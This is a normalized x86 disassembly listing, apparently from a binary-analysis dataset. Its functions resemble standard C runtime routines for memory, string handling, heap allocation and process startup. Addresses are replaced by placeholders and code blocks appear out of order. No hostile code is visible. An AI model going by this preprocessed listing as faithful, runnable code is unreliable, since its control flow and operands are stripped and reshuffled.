mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_41a01c
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_41ac98
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_419f0f
push sub_42fc01
mov [ rw-data ] esi
call sub_41b488
pop ecx
sub_41ac98
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_41acef
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41edc9
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_41c34a
test eax eax
je r-xdata
call sub_41c34a
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_41ad2f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_41adb0
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_41a0f0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_41c34a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_41efd5
mov eax esi
jmp r-xdata
sub_41adb0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_41efe5
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_41ae2a
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_41eda1
pop ecx
call sub_41c34a
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_41e4b0
push 0x1e
call sub_41e301
push 0xff
call sub_41f0ca
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_41c34a
mov [ eax ] esi
push ebx
call sub_41eda1
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_41c34a
mov [ eax ] esi
sub_41aec0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_41afa0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_41afe6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_41a460
add esp 0xc
call sub_41c34a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_41efd5
mov eax esi
jmp r-xdata
sub_41b039
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_41f8ce
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41f6c3
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_41b0bd
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420544
add esp 0x14
pop ebp
retn
sub_41b154
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_41b242
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
push edi
test esi esi
jne r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
call sub_41efd5
mov eax esi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call esi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop esi
leave
retn
xor eax eax
call sub_41c34a
mov [ eax ] 0xc
call sub_41c34a
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
call sub_41efd5
mov eax esi
jmp r-xdata
pop edi
push ebx
push esi
call [ EncodePointer@IAT ]
mov edi eax
call sub_41e6c2
push edi
push rw-data
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
pop ebx
je r-xdata
call sub_41c34a
mov esi [ GetLastError@IAT ]
mov edi eax
call esi
push eax
call sub_41c308
pop ecx
mov [ edi ] eax
call sub_41efd5
call esi
push eax
call sub_41c308
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_41b365
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_42140f
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_41c2ba
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_41c2ba
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_41b41b
mov edi edi
push esi
push 0x4
push 0x20
call sub_41c26e
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_41b44c
push 0xc
push r--data
call sub_421220
call sub_41f0e2
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_41b365
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b482
mov eax [ ebp - 0x1c ]
call sub_421265
retn
sub_41b49f
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41f6c3
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41f6c3
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_41b595
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_4214ea
call sub_41b49f
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_41b5bf
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
pop ebp
retn
call sub_41c34a
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_41efd5
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_4220ae
call sub_41b49f
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_41c34a
mov [ eax ] 0x22
sub_41b638
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b5bf
add esp 0x14
pop ebp
retn
sub_41b656
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_41c34a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_41efd5
mov eax esi
sub_41b6cb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_41c34a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_41efd5
mov eax esi
sub_41b72e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_4214ea
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41f6c3
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41f6c3
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_41b845
push 0x58
push r--data
call sub_421220
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_41e6a4
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_41ea29
test eax eax
jne r-xdata
push 0x1c
call sub_41b81c
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_42331e
mov [ ebp - 0x4 ] esi
call sub_4230d9
test eax eax
jns r-xdata
push 0x10
call sub_41b81c
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_423042
mov [ rw-data ] eax
call sub_422f87
test eax eax
jns r-xdata
push 0x1b
call sub_41f36c
call sub_422d11
test eax eax
jns r-xdata
push 0x8
call sub_41f36c
push 0x1
call sub_41f14b
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_41f36c
call sub_422cb2
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_41f36c
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_41f34e
jmp r-xdata
push eax
call sub_41f322
push ecx
push eax
push esi
push __dos_header
call sub_4192d0
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_421265
retn
sub_41b9bc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_41a7eb
pop ecx
sub_41b9dc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_41e872
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_41f64a
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_423628
mov [ esi + 0x4 ] eax
sub_41ba63
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_41ac09
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_41b9bc
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_41ae2a
pop ecx
cmp eax ebx
je r-xdata
call sub_423af0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_41b9bc
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_41ae2a
pop ecx
cmp eax ebx
je r-xdata
call sub_423af0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_41bc4a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41ba63
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41bcb9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_423b1c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41bd0a
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41bcb9
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_41bd38
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_423b1c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41bd89
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41bd38
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_41bdb7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_423b1c
